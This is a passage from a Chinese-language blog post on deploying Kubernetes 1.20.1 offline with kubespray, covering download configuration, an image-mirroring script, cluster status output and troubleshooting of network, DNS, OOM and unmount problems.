}}\u0026#34;container:truerepo:\u0026#34;{{ helm_image_repo }}\u0026#34;tag:\u0026#34;{{ helm_image_tag }}\u0026#34;sha256:\u0026#34;{{ helm_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodetiller:enabled:\u0026#34;{{ helm_enabled and helm_version is version(\u0026#39;v3.0.0\u0026#39;, \u0026#39;\u0026lt;\u0026#39;) }}\u0026#34;container:truerepo:\u0026#34;{{ tiller_image_repo }}\u0026#34;tag:\u0026#34;{{ tiller_image_tag }}\u0026#34;sha256:\u0026#34;{{ tiller_digest_checksum|default(None) }}\u0026#34;groups:- kube-noderegistry:enabled:\u0026#34;{{ registry_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ registry_image_repo }}\u0026#34;tag:\u0026#34;{{ registry_image_tag }}\u0026#34;sha256:\u0026#34;{{ registry_digest_checksum|default(None) }}\u0026#34;groups:- kube-noderegistry_proxy:enabled:\u0026#34;{{ registry_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ registry_proxy_image_repo }}\u0026#34;tag:\u0026#34;{{ registry_proxy_image_tag }}\u0026#34;sha256:\u0026#34;{{ registry_proxy_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodemetrics_server:enabled:\u0026#34;{{ metrics_server_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ metrics_server_image_repo }}\u0026#34;tag:\u0026#34;{{ metrics_server_image_tag }}\u0026#34;sha256:\u0026#34;{{ metrics_server_digest_checksum|default(None) }}\u0026#34;groups:- kube-masteraddon_resizer:# Currently addon_resizer is only used by metrics serverenabled:\u0026#34;{{ metrics_server_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ addon_resizer_image_repo }}\u0026#34;tag:\u0026#34;{{ addon_resizer_image_tag }}\u0026#34;sha256:\u0026#34;{{ addon_resizer_digest_checksum|default(None) }}\u0026#34;groups:- kube-masterlocal_volume_provisioner:enabled:\u0026#34;{{ local_volume_provisioner_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ local_volume_provisioner_image_repo }}\u0026#34;tag:\u0026#34;{{ local_volume_provisioner_image_tag }}\u0026#34;sha256:\u0026#34;{{ local_volume_provisioner_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodecephfs_provisioner:enabled:\u0026#34;{{ cephfs_provisioner_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ cephfs_provisioner_image_repo }}\u0026#34;tag:\u0026#34;{{ cephfs_provisioner_image_tag }}\u0026#34;sha256:\u0026#34;{{ cephfs_provisioner_digest_checksum|default(None) }}\u0026#34;groups:- kube-noderbd_provisioner:enabled:\u0026#34;{{ rbd_provisioner_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ rbd_provisioner_image_repo }}\u0026#34;tag:\u0026#34;{{ rbd_provisioner_image_tag }}\u0026#34;sha256:\u0026#34;{{ rbd_provisioner_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodelocal_path_provisioner:enabled:\u0026#34;{{ local_path_provisioner_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ local_path_provisioner_image_repo }}\u0026#34;tag:\u0026#34;{{ local_path_provisioner_image_tag }}\u0026#34;sha256:\u0026#34;{{ local_path_provisioner_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodeingress_nginx_controller:enabled:\u0026#34;{{ ingress_nginx_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ ingress_nginx_controller_image_repo }}\u0026#34;tag:\u0026#34;{{ ingress_nginx_controller_image_tag }}\u0026#34;sha256:\u0026#34;{{ ingress_nginx_controller_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodeingress_ambassador_controller:enabled:\u0026#34;{{ ingress_ambassador_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ ingress_ambassador_image_repo }}\u0026#34;tag:\u0026#34;{{ ingress_ambassador_image_tag }}\u0026#34;sha256:\u0026#34;{{ ingress_ambassador_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodeingress_alb_controller:enabled:\u0026#34;{{ ingress_alb_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ alb_ingress_image_repo }}\u0026#34;tag:\u0026#34;{{ alb_ingress_image_tag }}\u0026#34;sha256:\u0026#34;{{ ingress_alb_controller_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodecert_manager_controller:enabled:\u0026#34;{{ cert_manager_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ cert_manager_controller_image_repo }}\u0026#34;tag:\u0026#34;{{ cert_manager_controller_image_tag }}\u0026#34;sha256:\u0026#34;{{ cert_manager_controller_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodecert_manager_cainjector:enabled:\u0026#34;{{ cert_manager_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ cert_manager_cainjector_image_repo }}\u0026#34;tag:\u0026#34;{{ cert_manager_cainjector_image_tag }}\u0026#34;sha256:\u0026#34;{{ cert_manager_cainjector_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodecert_manager_webhook:enabled:\u0026#34;{{ cert_manager_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ cert_manager_webhook_image_repo }}\u0026#34;tag:\u0026#34;{{ cert_manager_webhook_image_tag }}\u0026#34;sha256:\u0026#34;{{ cert_manager_webhook_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodecsi_attacher:enabled:\u0026#34;{{ cinder_csi_enabled or aws_ebs_csi_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ csi_attacher_image_repo }}\u0026#34;tag:\u0026#34;{{ csi_attacher_image_tag }}\u0026#34;sha256:\u0026#34;{{ csi_attacher_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodecsi_provisioner:enabled:\u0026#34;{{ cinder_csi_enabled or aws_ebs_csi_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ csi_provisioner_image_repo }}\u0026#34;tag:\u0026#34;{{ csi_provisioner_image_tag }}\u0026#34;sha256:\u0026#34;{{ csi_provisioner_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodecsi_snapshotter:enabled:\u0026#34;{{ cinder_csi_enabled or aws_ebs_csi_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ csi_snapshotter_image_repo }}\u0026#34;tag:\u0026#34;{{ csi_snapshotter_image_tag }}\u0026#34;sha256:\u0026#34;{{ csi_snapshotter_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodesnapshot_controller:enabled:\u0026#34;{{ cinder_csi_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ snapshot_controller_image_repo }}\u0026#34;tag:\u0026#34;{{ snapshot_controller_image_tag }}\u0026#34;sha256:\u0026#34;{{ snapshot_controller_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodecsi_resizer:enabled:\u0026#34;{{ cinder_csi_enabled or aws_ebs_csi_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ csi_resizer_image_repo }}\u0026#34;tag:\u0026#34;{{ csi_resizer_image_tag }}\u0026#34;sha256:\u0026#34;{{ csi_resizer_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodecsi_node_driver_registrar:enabled:\u0026#34;{{ cinder_csi_enabled or aws_ebs_csi_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ csi_node_driver_registrar_image_repo }}\u0026#34;tag:\u0026#34;{{ csi_node_driver_registrar_image_tag }}\u0026#34;sha256:\u0026#34;{{ csi_node_driver_registrar_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodecinder_csi_plugin:enabled:\u0026#34;{{ cinder_csi_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ cinder_csi_plugin_image_repo }}\u0026#34;tag:\u0026#34;{{ cinder_csi_plugin_image_tag }}\u0026#34;sha256:\u0026#34;{{ cinder_csi_plugin_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodeaws_ebs_csi_plugin:enabled:\u0026#34;{{ aws_ebs_csi_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ aws_ebs_csi_plugin_image_repo }}\u0026#34;tag:\u0026#34;{{ aws_ebs_csi_plugin_image_tag }}\u0026#34;sha256:\u0026#34;{{ aws_ebs_csi_plugin_digest_checksum|default(None) }}\u0026#34;groups:- kube-nodedashboard:enabled:\u0026#34;{{ dashboard_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ dashboard_image_repo }}\u0026#34;tag:\u0026#34;{{ dashboard_image_tag }}\u0026#34;sha256:\u0026#34;{{ dashboard_digest_checksum|default(None) }}\u0026#34;groups:- kube-masterdashboard_metrics_scrapper:enabled:\u0026#34;{{ dashboard_enabled }}\u0026#34;container:truerepo:\u0026#34;{{ dashboard_metrics_scraper_repo }}\u0026#34;tag:\u0026#34;{{ dashboard_metrics_scraper_tag }}\u0026#34;sha256:\u0026#34;{{ dashboard_digest_checksum|default(None) }}\u0026#34;groups:- kube-masterdownload_defaults:container:falsefile:falserepo:Nonetag:Noneenabled:falsedest:Noneversion:Noneurl:Noneunarchive:falseowner:kubemode:None  文件服务file server 自定义文件服务file server，为kubespray提供下载文件\n1 2 3 4 5 6 7 8  [root@node2 file_server]# ll tmp/kubernetes/v1.20.1/ total 306004 -rw-r--r-- 1 root root 40783872 Dec 21 17:41 calicoctl-linux-amd64 -rw-r--r-- 1 root root 39641346 Dec 21 17:41 cni-plugins-linux-amd64-v0.8.7.tgz -rw-r--r-- 1 root root 39219200 Dec 18 20:21 kubeadm -rw-r--r-- 1 root root 40230912 Dec 18 20:21 kubectl -rw-r--r-- 1 root root 113982312 Dec 18 20:21 kubelet -rw-r--r-- 1 root root 39485440 Dec 18 20:21 kube-proxy   kubespray会把其中的文件下载到暂存目录/tmp/release下\n下载缓存目录/tmp/release 1 2 3 4 5 6 7 8 9  [root@node2 deploy-kube-batch]# ll /tmp/releases/ total 267444 -rwxr-xr-x 1 root root 40783872 Dec 22 17:14 calicoctl -rwxr-xr-x 1 root root 39641346 Dec 22 17:14 cni-plugins-linux-amd64-v0.8.7.tgz ###drwxr-xr-x 2 root root 6 Dec 22 17:14 images -rwxr-xr-x 1 root root 39219200 Dec 22 17:14 kubeadm-v1.20.1-amd64 -rwxr-xr-x 1 root root 40230912 Dec 22 17:14 kubectl-v1.20.1-amd64 -rwxr-xr-x 1 root root 113982312 Dec 22 17:14 kubelet-v1.20.1-amd64   命令目录文件 可以把下载后的文件\n kubeadm kubectl kubelet  放置到/usr/local/bin目录下。\n安装完成后的命令目录文件如下（其它文件是有kubspray下载完成的）：\n1 2 3 4 5 6 7 8 9  [root@node131 releases]# ll /usr/local/bin 总用量 206112 -rwxr-x---. 1 root root 351 12月 21 14:52 etcd -rwxr-xr-x. 1 root root 17620576 8月 25 03:22 etcdctl drwx------. 2 root root 30 12月 21 14:50 etcd-scripts -rwxr-x---. 1 root root 39219200 12月 21 15:18 kubeadm -rwxr-x---. 1 root root 40230912 12月 21 15:18 kubectl -rwxr-xr-x. 1 root root 113982312 12月 21 15:10 kubelet drwxr-xr-x. 2 kube root 6 12月 21 13:49 kubernetes-scripts   二进制文件下载\n安装过程中，某些二进制文件会下载很慢或者失败，则手动下载完成后 https://github.com/containernetworking/plugins/releases/download/v0.8.7/cni-plugins-linux-amd64-v0.8.7.tgz\n再把 下载 cni 部分注释掉 cni，如下：\n1 2 3 4 5 6 7 8 9 10 11 12  # cni:# enabled: true# file: true# version: \u0026#34;{{ cni_version }}\u0026#34;# dest: \u0026#34;{{local_release_dir}}/cni-plugins-linux-{{ image_arch }}-{{ cni_version }}.tgz\u0026#34;## sha256: \u0026#34;{{ cni_binary_checksum }}\u0026#34;# url: \u0026#34;{{ cni_download_url }}\u0026#34;# unarchive: false# owner: \u0026#34;root\u0026#34;# mode: \u0026#34;0755\u0026#34;# groups:# - k8s-cluster  calicoctl下载地址 https://github.com/projectcalico/calicoctl/releases/download/v3.15.2/calicoctl-linux-amd64\nk8s镜像下载 编辑下载脚本 需要按部署k8s版本修改版本参数 download_k8s_images.sh\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95  #!/bin/bash  # 关闭防火墙 # setenforce 0 # systemctl stop firewalld.service # use cmd to list images # ./kubeadm config images list --kubernetes-version=v1.20.1 # origin images # k8s.gcr.io/kube-apiserver:v1.20.1 # k8s.gcr.io/kube-controller-manager:v1.20.1 # k8s.gcr.io/kube-scheduler:v1.20.1 # k8s.gcr.io/kube-proxy:v1.20.1 # k8s.gcr.io/pause:3.2 # k8s.gcr.io/etcd:3.4.13-0 # k8s.gcr.io/coredns:1.7.0 echo \u0026#34;START downloading k8s.gcr.io/images...\u0026#34; images=( kube-apiserver:v1.20.1 kube-controller-manager:v1.20.1 kube-scheduler:v1.20.1 kube-proxy:v1.20.1 pause:3.2 # etcd:3.4.13-0 # etcd:3.4.3 coredns:1.7.0 # requests for kubespray k8s-dns-node-cache:1.15.13 # cluster-proportional-autoscaler-amd64:1.8.1 kube-registry-proxy:0.4 #metrics-server/metrics-server:v0.3.7 # metrics v0.3.7 找不到，改用v0.3.6 # metrics-server-amd64:v0.3.6 # ingress-nginx/controller:v0.35.0 addon-resizer:1.8.11 ) for imageName in ${images[@]} ; do docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/${imageName} docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/${imageName} k8s.gcr.io/${imageName} docker rmi registry.cn-hangzhou.aliyuncs.com/google_containers/${imageName} done # custom docker pull docker pull registry.cn-hangzhou.aliyuncs.com/ringtail/cluster-proportional-autoscaler-amd64:v1.3.0 docker tag registry.cn-hangzhou.aliyuncs.com/ringtail/cluster-proportional-autoscaler-amd64:v1.3.0 k8s.gcr.io/cluster-proportional-autoscaler-amd64:v1.3.0 docker rmi registry.cn-hangzhou.aliyuncs.com/ringtail/cluster-proportional-autoscaler-amd64:v1.3.0 docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/metrics-server-amd64:v0.3.6 docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/metrics-server-amd64:v0.3.6 k8s.gcr.io/metrics-server-amd64:v0.3.6 docker rmi registry.cn-hangzhou.aliyuncs.com/google_containers/metrics-server-amd64:v0.3.6 docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/nginx-ingress-controller:0.25.1 docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/nginx-ingress-controller:0.25.1 k8s.gcr.io/nginx-ingress-controller:0.25.1 docker rmi registry.cn-hangzhou.aliyuncs.com/google_containers/nginx-ingress-controller:0.25.1 # [root@node131 ~]# docker images # REPOSITORY TAG IMAGE ID CREATED SIZE # registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy v1.20.1 e3f6fcd87756 2 days ago 118MB # registry.cn-hangzhou.aliyuncs.com/google_containers/kube-apiserver v1.20.1 75c7f7112080 2 days ago 122MB # registry.cn-hangzhou.aliyuncs.com/google_containers/kube-controller-manager v1.20.1 2893d78e47dc 2 days ago 116MB # registry.cn-hangzhou.aliyuncs.com/google_containers/kube-scheduler v1.20.1 4aa0b4397bbb 2 days ago 46.4MB # registry.cn-hangzhou.aliyuncs.com/google_containers/coredns 1.7.0 bfe3a36ebd25 6 months ago 45.2MB # registry.cn-hangzhou.aliyuncs.com/google_containers/pause 3.2 80d28bedfe5d 10 months ago 683kB # [root@node131 ~]# docker images # REPOSITORY TAG IMAGE ID CREATED SIZE # k8s.gcr.io/kube-proxy v1.20.1 e3f6fcd87756 2 days ago 118MB # k8s.gcr.io/kube-controller-manager v1.20.1 2893d78e47dc 2 days ago 116MB # k8s.gcr.io/kube-apiserver v1.20.1 75c7f7112080 2 days ago 122MB # k8s.gcr.io/kube-scheduler v1.20.1 4aa0b4397bbb 2 days ago 46.4MB # k8s.gcr.io/coredns 1.7.0 bfe3a36ebd25 6 months ago 45.2MB # k8s.gcr.io/pause 3.2 80d28bedfe5d 10 months ago 683kB echo \u0026#34;END downloading k8s.gcr.io/images...\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;START downloading quay.io/images...\u0026#34; # docker pull quay-mirror.qiniu.com/coreos/flannel # docker pull quay.io/coreos/etcd:v3.4.13 echo \u0026#34;END downloading quay.io/images...\u0026#34;   执行脚本 1  bash download_k8s_images.sh   非下载方式说明 如果没有file server服务。\n  需要把手动把命令目录文件拷贝到/usr/local/bin\n kubectl kubeadm kubelet    同时把其它下载文件如网络插件cni等下载包，放到/tmp/release目录下\n  k8s相关镜像 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  REPOSITORY TAG IMAGE ID CREATED SIZE k8s.gcr.io/kube-proxy v1.20.1 e3f6fcd87756 4 days ago 118MB k8s.gcr.io/kube-controller-manager v1.20.1 2893d78e47dc 4 days ago 116MB k8s.gcr.io/kube-apiserver v1.20.1 75c7f7112080 4 days ago 122MB k8s.gcr.io/kube-scheduler v1.20.1 4aa0b4397bbb 4 days ago 46.4MB nginx 1.19 ae2feff98a0c 7 days ago 133MB calico/node latest 048e0ac26968 4 weeks ago 165MB kubernetesui/dashboard-amd64 v2.0.4 46d0a29c3f61 3 months ago 225MB calico/node v3.15.2 cc7508d4d2d4 4 months ago 262MB calico/cni v3.15.2 5dadc388f979 4 months ago 110MB calico/kube-controllers v3.15.2 fbbc4a1a0e98 4 months ago 52.9MB quay.io/coreos/etcd v3.4.13 d1985d404385 4 months ago 83.8MB k8s.gcr.io/addon-resizer 1.8.11 b7db21b30ad9 5 months ago 32.8MB coredns/coredns 1.7.0 bfe3a36ebd25 6 months ago 45.2MB k8s.gcr.io/coredns 1.7.0 bfe3a36ebd25 6 months ago 45.2MB kubernetesui/metrics-scraper v1.0.5 2cd72547f23f 6 months ago 36.7MB k8s.gcr.io/k8s-dns-node-cache 1.15.13 3f7a09f7cade 7 months ago 107MB k8s.gcr.io/pause 3.2 80d28bedfe5d 10 months ago 683kB k8s.gcr.io/metrics-server-amd64 v0.3.6 9dd718864ce6 14 months ago 39.9MB k8s.gcr.io/nginx-ingress-controller 0.25.1 0439eb3e11f1 16 months ago 511MB k8s.gcr.io/cluster-proportional-autoscaler-amd64 v1.3.0 33813c948942 2 years ago 45.8MB k8s.gcr.io/kube-registry-proxy 0.4 60dc18151daf 3 years ago 188MB    k8s核心组件版本：1.20.1 etcd版本：3.4.13  k8s组件适配 kube-batch 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  [root@node2 kube-batch]# ./deploy.sh configmap/kube-batch created Warning: rbac.authorization.k8s.io/v1beta1 ClusterRoleBinding is deprecated in v1.17+, unavailable in v1.22+; use rbac.authorization.k8s.io/v1 ClusterRoleBinding clusterrolebinding.rbac.authorization.k8s.io/default-sa-admin created deployment.apps/kube-batch created Warning: apiextensions.k8s.io/v1beta1 CustomResourceDefinition is deprecated in v1.16+, unavailable in v1.22+; use apiextensions.k8s.io/v1 CustomResourceDefinition customresourcedefinition.apiextensions.k8s.io/podgroups.scheduling.incubator.k8s.io created Warning: apiextensions.k8s.io/v1beta1 CustomResourceDefinition is deprecated in v1.16+, unavailable in v1.22+; use apiextensions.k8s.io/v1 CustomResourceDefinition customresourcedefinition.apiextensions.k8s.io/queues.scheduling.incubator.k8s.io created Warning: apiextensions.k8s.io/v1beta1 CustomResourceDefinition is deprecated in v1.16+, unavailable in v1.22+; use apiextensions.k8s.io/v1 CustomResourceDefinition customresourcedefinition.apiextensions.k8s.io/podgroups.scheduling.sigs.dev created Warning: apiextensions.k8s.io/v1beta1 CustomResourceDefinition is deprecated in v1.16+, unavailable in v1.22+; use apiextensions.k8s.io/v1 CustomResourceDefinition customresourcedefinition.apiextensions.k8s.io/queues.scheduling.sigs.dev created service/kube-batch-prometheus-discovery created queue.scheduling.incubator.k8s.io/default created queue.scheduling.incubator.k8s.io/emergency-queue created queue.scheduling.incubator.k8s.io/00000000000000000000000000000000 created   apiextensions.k8s.io/v1beta1 需要转换为 apiextensions.k8s.io/v1\n安装完成状态 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  [root@node2 inventory]# kubectl get po -A -owide NAMESPACE NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES default myapp-batch-pod 1/1 Running 3 3h11m 10.233.96.8 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; default myapp-pod 1/1 Running 17 3h53m 10.233.95.9 gpu53 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system calico-kube-controllers-67f55f8858-xxnrs 1/1 Running 3 18h 10.151.11.53 gpu53 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system calico-node-5ww7v 1/1 Running 1 17h 10.151.11.61 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system calico-node-9fkz2 1/1 Running 2 17h 10.151.11.53 gpu53 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system coredns-8677555d68-bjkl2 1/1 Running 2 18h 10.233.96.5 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system dns-autoscaler-5fb74f6dd4-wj62q 0/1 Running 2 18h 10.233.96.6 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-apiserver-node2 1/1 Running 2 18h 10.151.11.61 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-batch-56858cf46f-tmnsb 1/1 Running 0 3h25m 10.233.96.7 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-controller-manager-node2 1/1 Running 2 18h 10.151.11.61 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-77tw9 1/1 Running 2 18h 10.151.11.61 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-8vsdb 1/1 Running 3 18h 10.151.11.53 gpu53 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-scheduler-node2 1/1 Running 2 18h 10.151.11.61 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kubernetes-dashboard-dfb67d98c-b8n5j 1/1 Running 4 18h 10.233.95.7 gpu53 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kubernetes-metrics-scraper-54df648466-4jcc2 1/1 Running 3 18h 10.233.95.8 gpu53 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system nginx-proxy-gpu53 1/1 Running 3 18h 10.151.11.53 gpu53 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system nodelocaldns-m26kx 1/1 Running 2 18h 10.151.11.61 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system nodelocaldns-qm62v 1/1 Running 3 18h 10.151.11.53 gpu53 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; [root@node2 inventory]# [root@node2 inventory]# [root@node2 inventory]# [root@node2 inventory]# kubectl get no -owide NAME STATUS ROLES AGE VERSION INTERNAL-IP EXTERNAL-IP OS-IMAGE KERNEL-VERSION CONTAINER-RUNTIME gpu53 Ready \u0026lt;none\u0026gt; 18h v1.20.1 10.151.11.53 \u0026lt;none\u0026gt; CentOS Linux 7 (Core) 3.10.0-862.el7.x86_64 docker://19.3.12 node2 Ready control-plane,master 18h v1.20.1 10.151.11.61 \u0026lt;none\u0026gt; CentOS Linux 7 (Core) 3.10.0-862.el7.x86_64 docker://19.3.12   说明：dns-autoscaler没有起来，是因为其版本过低。与集群k8s版本不匹配导致，其不影响k8s组件测试\n问题 coredns等报错：connect: no route to host 现象： dial tcp 10.233.0.1:443: connect: no route to host\n执行下面命令解决\n1 2 3 4 5 6  systemctl stop kubelet systemctl stop docker iptables --flush iptables -tnat --flush systemctl start docker systemctl start kubelet   The route problem can be solved by flush iptables. 类似网络路由问题，都可以使用上面命令解决\ncoredns pod 没有起来 HTTP probe failed with statuscode: 503\n1 2 3 4 5 6 7  2月 02 10:09:19 node131 kubelet[36705]: I0202 10:09:19.484131 36705 prober.go:117] Readiness probe for \u0026#34;coredns-8677555d68-tjw4l_kube-system(863c8ab1-0f68-437e-a8fc-735cc65a5ba6):coredns\u0026#34; failed (failure): HTTP probe failed with statuscode: 503 2月 02 10:09:24 node131 kubelet[36705]: I0202 10:09:24.626538 36705 setters.go:86] Using node IP: \u0026#34;192.168.182.131\u0026#34; 2月 02 10:09:29 node131 kubelet[36705]: I0202 10:09:29.484193 36705 prober.go:117] Readiness probe for \u0026#34;coredns-8677555d68-tjw4l_kube-system(863c8ab1-0f68-437e-a8fc-735cc65a5ba6):coredns\u0026#34; failed (failure): HTTP probe failed with statuscode: 503 2月 02 10:09:34 node131 kubelet[36705]: I0202 10:09:34.691889 36705 setters.go:86] Using node IP: \u0026#34;192.168.182.131\u0026#34; 2月 02 10:09:39 node131 kubelet[36705]: I0202 10:09:39.484596 36705 prober.go:117] Readiness probe for \u0026#34;coredns-8677555d68-tjw4l_kube-system(863c8ab1-0f68-437e-a8fc-735cc65a5ba6):coredns\u0026#34; failed (failure): HTTP probe failed with statuscode: 503   查看防火墙，并关闭防火墙\n查看防火墙的状态的命令为：\n1  sudo systemctl status firewalld   打开防火墙的方式有两种，一种是打开后重启会恢复回原来的状态，命令为：\nsudo systemctl start firewalld 另一种是打开后重启不会恢复到原来的状态，命令为：\n1  sudo systemctl enable firewalld   这种方式输入命令后要重启系统才会生效。\n关闭防火墙的方式也有两种，和打开相对应，命令分别为\n1 2  sudo systemctl stop firewalld sudo systemctl disable firewalld   dns-autoscaler 报错 dns-autoscaler Update failure: the server could not find the requested resource\nE1222 01:07:18.706470 1 autoscaler_server.go:120] Update failure: the server could not find the requested resource\n由于dns-autoscaler安装部署使用了低版本，现象分析可能是由于接口不匹配导致\n创建pod报错 networkPlugin cni failed to set up pod \u0026ldquo;myapp-pod_default\u0026rdquo; network: failed to Statfs \u0026ldquo;/proc/62177/ns/net\u0026rdquo;: no such file or directory\nnetworkPlugin cni failed to set up pod network: failed to Statfs: no such file or directory 有人建议操作如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  I executed following commands: sudo systemctl stop kubelet docker ps docker stop [all running containers id] rm -rf /etc/cni/net.d/* sudo kubeadm reset sudo iptables -F \u0026amp;\u0026amp; sudo iptables -t nat -F \u0026amp;\u0026amp; sudo iptables -t mangle -F \u0026amp;\u0026amp; sudo iptables -X sudo systemctl restart docker.service https://github.com/kubernetes/kubernetes/issues/90429 https://github.com/kubernetes/kubernetes/issues/72044 https://github.com/vmware-tanzu/antrea/issues/831   仔细分析系统日志/var/log/messages，发现Memory cgroup out of memory导致\n1 2 3 4 5 6 7 8  Dec 22 14:58:50 node131 kernel: Memory cgroup stats for /kubepods.slice/kubepods-pod7458ce47_f199_4abc_bced_747429207f75.slice/docker-efdd061c291cc737e425bfe6b7f25a69352d75a99415143955098311908588c8.scope: cache:0KB rss:2048KB rss_huge:0KB mapped_file:0KB swap:0KB inactive_anon:0KB active_anon:2008KB inactive_file:0KB active_file:0KB unevictable:0KB Dec 22 14:58:50 node131 kernel: [ pid ] uid tgid total_vm rss nr_ptes swapents oom_score_adj name Dec 22 14:58:50 node131 kernel: [17978] 0 17978 39699 2343 27 0 -998 runc:[2:INIT] Dec 22 14:58:50 node131 kernel: Memory cgroup out of memory: Kill process 17983 (runc:[2:INIT]) score 4628 or sacrifice child Dec 22 14:58:50 node131 kernel: Killed process 17978 (runc:[2:INIT]), UID 0, total-vm:158796kB, anon-rss:6420kB, file-rss:2952kB, shmem-rss:0kB Dec 22 14:58:50 node131 kubelet: W1222 14:58:50.043333 1923 helpers.go:198] readString: Failed to read \u0026#34;/sys/fs/cgroup/memory/kubepods.slice/kubepods-pod7458ce47_f199_4abc_bced_747429207f75.slice/docker-efdd061c291cc737e425bfe6b7f25a69352d75a99415143955098311908588c8.scope/memory.limit_in_bytes\u0026#34;: read /sys/fs/cgroup/memory/kubepods.slice/kubepods-pod7458ce47_f199_4abc_bced_747429207f75.slice/docker-efdd061c291cc737e425bfe6b7f25a69352d75a99415143955098311908588c8.scope/memory.limit_in_bytes: no such device   修改pod 请求内存，一般是请求内存太小，导致实际使用内存超过限制，被系统杀掉该pod进程\n出现目录无法删除：Device or resource busy 1 2 3 4 5 6  [root@gpu53 lib]# rm -rf kubelet/ rm: cannot remove ‘kubelet/pods/837704db-2bae-11eb-913c-6c92bf8c5840/volumes/kubernetes.io~secret/kube-proxy-token-8mdk5’: Device or resource busy rm: cannot remove ‘kubelet/pods/bce1b611-2bc3-11eb-9c41-6c92bf8c5840/volumes/kubernetes.io~secret/calico-node-token-d9dv8’: Device or resource busy rm: cannot remove ‘kubelet/pods/402d0c26-43fd-11eb-bdb1-6c92bf8c5840/volumes/kubernetes.io~secret/default-token-vlvfj’: Device or resource busy   lsof没有信息，则查看挂载信息，并取消挂载。\n1 2 3 4 5  # mount tmpfs on /var/lib/kubelet/pods/bce1b611-2bc3-11eb-9c41-6c92bf8c5840/volumes/kubernetes.io~secret/calico-node-token-d9dv8 type tmpfs (rw,relatime) tmpfs on /var/lib/kubelet/pods/837704db-2bae-11eb-913c-6c92bf8c5840/volumes/kubernetes.io~secret/kube-proxy-token-8mdk5 type tmpfs (rw,relatime)   1 2 3 4 5 6 7 8 9 10 11 12 13  [root@gpu53 lib]# mount |grep kubelet tmpfs on /var/lib/kubelet/pods/837704db-2bae-11eb-913c-6c92bf8c5840/volumes/kubernetes.io~secret/kube-proxy-token-8mdk5 type tmpfs (rw,relatime) tmpfs on 